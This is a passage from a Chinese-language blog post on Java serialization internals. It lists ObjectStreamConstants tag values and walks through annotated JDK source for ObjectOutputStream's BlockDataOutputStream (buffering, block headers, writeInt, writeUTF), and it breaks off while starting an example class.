byte</td><td>TC_ENDBLOCKDATA</td><td>一个对象的可选数据块的结尾</td><td>0x78</td></tr><tr><td>static byte</td><td>TC_RESET</td><td>重置流上下文</td><td>0x79</td></tr><tr><td>static byte</td><td>TC_BLOCKDATALONG</td><td>long类型数据块，标记long类型数据块的数量</td><td>0x7A</td></tr><tr><td>static byte</td><td>TC_EXCEPTION</td><td>写过程发生异常</td><td>0x7B</td></tr><tr><td>static byte</td><td>TC_LONGSTRING</td><td>long字符串</td><td>0x7C</td></tr><tr><td>static byte</td><td>TC_PROXYCLASSDESC</td><td>new 代理类描述符</td><td>0x7D</td></tr><tr><td>static byte</td><td>TC_ENUM</td><td>new 枚举常量</td><td>0x7E</td></tr><tr><td>static byte</td><td>TC_MAX</td><td>最后一个标签值</td><td>0x7E</td></tr><tr><td>static int</td><td>baseWireHandle</td><td>分配的第一个句柄</td><td>0x7e0000</td></tr><tr><td>static byte</td><td>SC_WRITE_METHOD</td><td>对于objectstreamclass标志位屏蔽。表示一个可序列化的类自定义了writeObject()</td><td>0x01</td></tr><tr><td>static byte</td><td>SC_SERIALIZABLE</td><td>对于objectstreamclass标志位屏蔽。显示类的序列化，实现Serializable</td><td>0x02</td></tr><tr><td>static byte</td><td>SC_EXTERNALIZABLE</td><td>对于objectstreamclass标志位屏蔽。指示类是外部的，实现Externalizable</td><td>0x04</td></tr><tr><td>static byte</td><td>SC_BLOCK_DATA</td><td>对于objectstreamclass标志位屏蔽。说明写的块数据模式的外部数据</td><td>0x08</td></tr><tr><td>static byte</td><td>SC_ENUM</td><td>对于objectstreamclass标志位屏蔽。指出类是一个枚举类型，Enum</td><td>0x10</td></tr><tr><td>static int</td><td>PROTOCOL_VERSION_1</td><td>流协议的版本</td><td>0x0001</td></tr><tr><td>static int</td><td>PROTOCOL_VERSION_2</td><td>流协议的版本</td><td>0x0002</td></tr><tr><td>static SerializablePermission</td><td>SUBCLASS_IMPLEMENTATION_PERMISSION</td><td>允许重写 readObject 和 writeObject</td><td>new SerializablePermission(“enableSubclassImplementation”);</td></tr><tr><td>static SerializablePermission</td><td>SUBSTITUTION_PERMISSION</td><td>允许在序列化/反序列化期间使用一个对象取代另一个对象。</td><td>new SerializablePermission(“enableSubstitution”);</td></tr></tbody></table><h2 id="五、ObjectOutputStream"><a href="#五、ObjectOutputStream" class="headerlink" title="五、ObjectOutputStream"></a>五、ObjectOutputStream</h2><p>ObjectOutStream有7个内部类，其作用如下：</p><ol><li>BlockDataOutputStream Java基本数据类型的写入流实现</li><li>Caches 用于安全审计缓存</li><li>DebugTraceInfoStack 堆栈保存有关序列化进程状态的调试信息，以便嵌入异常消息</li><li>HandleTable 保存对象及其句柄的映射关系 作用是缓存写过的共享class便于下次查找</li><li>ReplaceTable 替换对象的映射关系</li><li>PutField和PutFieldImpl 动态修改序列化的字段</li></ol><p>先着重分析下BlockDataOutputStream，再分析ObjectOutputStream的方法及序列化流程。</p><h3 id="1、静态内部类BlockDataOutputStream-Java基本数据类型的写入流实现"><a href="#1、静态内部类BlockDataOutputStream-Java基本数据类型的写入流实现" class="headerlink" title="1、静态内部类BlockDataOutputStream-Java基本数据类型的写入流实现"></a>1、静态内部类BlockDataOutputStream-Java基本数据类型的写入流实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BlockDataOutputStream</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">OutputStream</span> <span class="keyword">implements</span> <span class="title">DataOutput</span></span></span><br></pre></td></tr></table></figure><p>BlockDataOutputStream实现了DataOutput并且继承了OutputStream，该类主要用来将数据从Java基本类型转换字节流并写入底层数据流。</p><p>缓冲输出流有两种模式：在默认模式下，输出数据和DataOutputStream使用同样模式；在块数据模式下，使用一个缓冲区来缓存数据到达最大长度或者手动刷新时将内容写入底层数据流，块模式在写数据之前，要先写入一个头部来表示当前块的长度。</p><p>从内部变量和构造函数中可以看出，缓冲区的大小是固定且不可修改的，其中包含了一个下层输入流和一个数据输出流以及是否采用块模式的标识，在构造时默认不采用块数据模式。</p><h4 id="1-1、BlockDataOutputStream构造方法："><a href="#1-1、BlockDataOutputStream构造方法：" class="headerlink" title="1.1、BlockDataOutputStream构造方法："></a>1.1、BlockDataOutputStream构造方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BlockDataOutputStream</span> <span class="keyword">extends</span> <span class="title">OutputStream</span> <span class="keyword">implements</span> <span class="title">DataOutput</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="comment">/** maximum data block length */</span></span><br><span class="line">        <span class="comment">// 缓冲数据块长度1024</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_BLOCK_SIZE = <span class="number">1024</span>;</span><br><span class="line">        <span class="comment">/** maximum data block header length */</span> </span><br><span class="line">        <span class="comment">// 头部最大长度5</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX_HEADER_SIZE = <span class="number">5</span>;</span><br><span class="line">        <span class="comment">/** (tunable) length of char buffer (for writing strings) */</span></span><br><span class="line">        <span class="comment">// 针对string类型 ：char字符缓冲块长度256</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CHAR_BUF_SIZE = <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** buffer for writing general/block data */</span></span><br><span class="line">    <span class="comment">// 字节数据块缓冲区</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[MAX_BLOCK_SIZE];</span><br><span class="line">        <span class="comment">/** buffer for writing block data headers */</span></span><br><span class="line">    <span class="comment">// 头部缓冲区</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] hbuf = <span class="keyword">new</span> <span class="keyword">byte</span>[MAX_HEADER_SIZE];</span><br><span class="line">        <span class="comment">/** char buffer for fast string writes */</span></span><br><span class="line">    <span class="comment">// 字符数据缓冲区</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span>[] cbuf = <span class="keyword">new</span> <span class="keyword">char</span>[CHAR_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** block data mode */</span></span><br><span class="line">    <span class="comment">// 块数据模式，默认关闭</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">boolean</span> blkmode = <span class="keyword">false</span>;</span><br><span class="line">        <span class="comment">/** current offset into buf */</span></span><br><span class="line">    <span class="comment">// 在字节数据缓冲区的当前偏移量，初始为0</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** underlying output stream */</span></span><br><span class="line">    <span class="comment">// 底层数据流</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> OutputStream out;</span><br><span class="line">        <span class="comment">/** loopback stream (for data writes that span data blocks) */</span></span><br><span class="line">    <span class="comment">// 回路流用于写跨越数据块的数据</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> DataOutputStream dout;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在底层流上创建一个BlockDataOutputStream，块数据模式默认关闭</span></span><br><span class="line">        BlockDataOutputStream(OutputStream out) &#123;</span><br><span class="line">            <span class="keyword">this</span>.out = out;</span><br><span class="line">            dout = <span class="keyword">new</span> DataOutputStream(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="1-2、块数据模式及底层流数据写入"><a href="#1-2、块数据模式及底层流数据写入" class="headerlink" title="1.2、块数据模式及底层流数据写入"></a>1.2、块数据模式及底层流数据写入</h4><p>BlockDataOutputStream定义了两个方法用于设置和获取块数据模式：setBlockDataMode可以改变当前的数据模式，从块数据模式切换到非块数据模式时，要将缓冲区内的数据写入到底层流；getBlockDataMode查询当前块数据模式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置块数据模式为给出的模式true是开启，false是关闭，并返回之前的模式值。</span></span><br><span class="line"><span class="comment"> * 如果新的模式和旧的一样，什么都不做。</span></span><br><span class="line"><span class="comment"> * 如果新的模式和旧的模式不同，所有的缓冲区数据要在转换到新模式之前刷新。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">setBlockDataMode</span><span class="params">(<span class="keyword">boolean</span> mode)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (blkmode == mode) &#123;</span><br><span class="line">        <span class="keyword">return</span> blkmode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将缓冲区内的数据全部写入底层流</span></span><br><span class="line">    drain();</span><br><span class="line">    blkmode = mode;</span><br><span class="line">    <span class="keyword">return</span> !blkmode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当前流为块数据模式返回true，否则返回false</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">getBlockDataMode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> blkmode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>drain在多个方法中被调用，作用是将<strong>缓冲区内的数据全部写入底层流</strong>，但不会刷新底层流，在写入实际数据前要先用writeBlockHeader写入块头部，头部包含1字节标识位和1字节或4字节的长度大小</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将缓冲数据写入到底层流，但是不刷新底层流</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 空缓冲区</span></span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 块数据模式头部数据写入</span></span><br><span class="line">    <span class="keyword">if</span> (blkmode) &#123;</span><br><span class="line">        writeBlockHeader(pos);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写入缓冲区数据</span></span><br><span class="line">    out.write(buf, <span class="number">0</span>, pos);</span><br><span class="line">    <span class="comment">// 重置缓冲区偏移</span></span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写块数据的头部信息，数据块少于256字节 头部写入2个字节，多于256字节则写入5个字节的头部</span></span><br><span class="line"><span class="comment">// 因为255字节以内可以用1字节来表示长度，4字节可以表示int范围内的最大整数</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeBlockHeader</span><span class="params">(<span class="keyword">int</span> len)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 小于256，TC_BLOCKDATA 0x77标记字节跟随标记表示此块数据中的字节数</span></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0xFF</span>) &#123;</span><br><span class="line">        hbuf[<span class="number">0</span>] = TC_BLOCKDATA;</span><br><span class="line">        hbuf[<span class="number">1</span>] = (<span class="keyword">byte</span>) len;</span><br><span class="line">        out.write(hbuf, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 大于255，TC_BLOCKDATALONG 0x7A标记long类型数据块</span></span><br><span class="line">        hbuf[<span class="number">0</span>] = TC_BLOCKDATALONG;</span><br><span class="line">        Bits.putInt(hbuf, <span class="number">1</span>, len);</span><br><span class="line">        out.write(hbuf, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通用数据流写入的处理方法：<strong>write主要是写入到缓冲区</strong>，写入前都需要先检查缓冲区有没有达到上限，达到时需要先刷新，然后再将数据复制到缓冲区。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ----------------- 通用数据流处理方法 ----------------- */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 下面的方法 除了在参与块数据模式下写入数据到数据块中的部分有所不同</span></span><br><span class="line"><span class="comment"> * 其它都等价于他们在OutputStream中的对应方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//存储一个字节的数据到缓冲区，如果缓冲区满了先刷新缓冲区写入底层流</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> b)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 达到缓冲区上限，将缓冲区内的数据全部写入底层流</span></span><br><span class="line">    <span class="keyword">if</span> (pos &gt;= MAX_BLOCK_SIZE) &#123;</span><br><span class="line">        drain();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 存储一个字节的数据到缓冲区</span></span><br><span class="line">    buf[pos++] = (<span class="keyword">byte</span>) b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span>[] b)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    write(b, <span class="number">0</span>, b.length, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    write(b, off, len, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从给定数组写入指定的字节值范围。如果copy为true，则在将值写入底层流之前将其复制到中间缓冲区(以避免暴露对原始字节数组的引用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write</span><span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len, <span class="keyword">boolean</span> copy)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 非copy模式也非块数据模式直接将数据写入底层流</span></span><br><span class="line">    <span class="keyword">if</span> (!(copy || blkmode)) &#123;</span><br><span class="line">        drain();</span><br><span class="line">        out.write(b, off, len);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 达到缓冲区上限，将缓冲区内的数据全部写入底层流</span></span><br><span class="line">        <span class="keyword">if</span> (pos &gt;= MAX_BLOCK_SIZE) &#123;</span><br><span class="line">            drain();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (len &gt;= MAX_BLOCK_SIZE &amp;&amp; !copy &amp;&amp; pos == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 长度大于缓冲区 非copy模式 且缓冲区为空直接写，避免不必要的复制</span></span><br><span class="line">            writeBlockHeader(MAX_BLOCK_SIZE);</span><br><span class="line">            out.write(b, off, MAX_BLOCK_SIZE);</span><br><span class="line">            off += MAX_BLOCK_SIZE;</span><br><span class="line">            len -= MAX_BLOCK_SIZE;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 剩余内容在缓冲区内放得下 或者缓冲区不为空 或者是copy模式，则将数据复制到缓冲区</span></span><br><span class="line">            <span class="keyword">int</span> wlen = Math.min(len, MAX_BLOCK_SIZE - pos);</span><br><span class="line">            System.arraycopy(b, off, buf, pos, wlen);</span><br><span class="line">            pos += wlen;</span><br><span class="line">            off += wlen;</span><br><span class="line">            len -= wlen;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 刷新缓冲区并且刷新底层流</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    drain();</span><br><span class="line">    out.flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//刷新后关闭流</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    flush();</span><br><span class="line">    out.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-3、BlockDataOutputStream处理基元数据输出方法："><a href="#1-3、BlockDataOutputStream处理基元数据输出方法：" class="headerlink" title="1.3、BlockDataOutputStream处理基元数据输出方法："></a>1.3、BlockDataOutputStream处理基元数据输出方法：</h4><p>剩余写不同基元数据的方法到缓冲区都类似，write[Type]和write[Type]s一个是处理单个基元数据和一组连续基元数据的情况，write[Type]s相对来说更加优化，以便更有效地写入一组基元数据值或者处理写基元类型的数组，其优化的方式是先计算出缓冲区内的剩余大小，计算可以写入的个数，然后直接写入而不是每次写入之前检查缓冲区是否有空间，减少判断次数。</p><p>下面以writeInt和writeInts对Int类型的写入方法深入探究下，其它方法类似不再赘诉。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ----------------- 基元数据输出方法 ----------------- */</span></span><br><span class="line"><span class="comment">// 基元数据输出方法方法与DataOutputStream中的对应方法等效，只是在块数据模式下，它们将写入的数据写入缓冲区。基本上逻辑都是先检查空间是否足够，不足的话先刷新缓冲区，然后将数据存储到缓冲区中。写一个字符串时，需要先将字符串中的字符存储到字符缓冲数组中，然后再转换成字节存储到buf中。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeInt</span><span class="params">(<span class="keyword">int</span> v)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//先检查缓冲区是否达到上限，注意一个Int值占4个字节</span></span><br><span class="line">    <span class="keyword">if</span> (pos + <span class="number">4</span> &lt;= MAX_BLOCK_SIZE) &#123;</span><br><span class="line">        <span class="comment">// Bits.putInt将Int值转为字节存储到字节缓冲区</span></span><br><span class="line">        Bits.putInt(buf, pos, v);</span><br><span class="line">        pos += <span class="number">4</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// DataOutputStream.writeInt达到缓冲区将int作为4个字节写入底层输出流</span></span><br><span class="line">        dout.writeInt(v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* -------------- 连续多个基元数据输出方法 -------------- */</span></span><br><span class="line"><span class="comment">//下面的方法写出基元数据值的范围。虽然相当于重复调用相应的基元写方法，但这些方法都经过了重新优化，以便更有效地写入一组基元数据值。</span></span><br><span class="line"><span class="comment">//优化的方式是先计算出缓冲区内的剩余大小，计算可以写入的个数，然后直接写入而不是每次写入之前检查缓冲区是否有空间，减少判断次数。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeInts</span><span class="params">(<span class="keyword">int</span>[] v, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 缓冲区上限</span></span><br><span class="line">    <span class="keyword">int</span> limit = MAX_BLOCK_SIZE - <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// 基元数据值的范围，最终偏移位置</span></span><br><span class="line">    <span class="keyword">int</span> endoff = off + len;</span><br><span class="line">    <span class="comment">// 连续写入多个int数据</span></span><br><span class="line">    <span class="keyword">while</span> (off &lt; endoff) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pos &lt;= limit) &#123;</span><br><span class="line">            <span class="comment">// 除以2的2次方，int是4个字节，所以除以4，计算缓冲区剩余有效int的个数</span></span><br><span class="line">            <span class="keyword">int</span> avail = (MAX_BLOCK_SIZE - pos) &gt;&gt; <span class="number">2</span>; </span><br><span class="line">            <span class="comment">// 比较最终偏移位置和当前偏移位置+缓冲区剩余有效int个数 取最小值</span></span><br><span class="line">            <span class="keyword">int</span> stop = Math.min(endoff, off + avail); </span><br><span class="line">            <span class="keyword">while</span> (off &lt; stop) &#123;</span><br><span class="line">                <span class="comment">// 未达缓冲区上限，连续存储数据到缓冲区，减少了判断缓冲区是否满的次数</span></span><br><span class="line">                <span class="comment">// Bits.putInt将int类型转为字节存储到字节缓冲区</span></span><br><span class="line">                Bits.putInt(buf, pos, v[off++]);</span><br><span class="line">                pos += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 达到缓冲区上限</span></span><br><span class="line">            <span class="comment">// DataOutputStream.writeInt用于将int数据作为4个字节写入底层输出流，高字节优先</span></span><br><span class="line">            dout.writeInt(v[off++]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了write[Type]和write[Type]s，还有writeUTF 写UTF8格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以UTF格式写入给定的字符串。此方法用于字符串的UTF编码长度已经已知的情况;显式地指定它可以避免对字符串进行预扫描以确定其UTF长度。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeUTF</span><span class="params">(String s, <span class="keyword">long</span> utflen)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (utflen &gt; <span class="number">0xFFFFL</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UTFDataFormatException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写字符串长度，两个字节</span></span><br><span class="line">    writeShort((<span class="keyword">int</span>) utflen);</span><br><span class="line">    <span class="keyword">if</span> (utflen == (<span class="keyword">long</span>) s.length()) &#123;</span><br><span class="line">        <span class="comment">// 如果要写入的长度就是字符串s的长度，直接用writeBytes(s)写入</span></span><br><span class="line">        writeBytes(s);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//否则 用writeUTFBody写入</span></span><br><span class="line">        writeUTFBody(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2、序列化导读"><a href="#2、序列化导读" class="headerlink" title="2、序列化导读"></a>2、序列化导读</h3><p>在开始分析writeObject前，再来强调下，Java序列化时只能序列化该对象的类信息、属性及其值，<strong>不能序列化对象的方法</strong>，JAVA序列化了类信息以后也就可以通过类调用其方法了。所以最终writeObject序列化后的结果一定是类信息和属性的序列化。</p><p>为了方便后面writeObject的分析，先看下一个序列化的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要序列化的类必须实现Serializable</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestSerializable</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="comment">// 设置serialVersionUID</span></span><br><span class="line">    <span class="keyword">private</span> <span 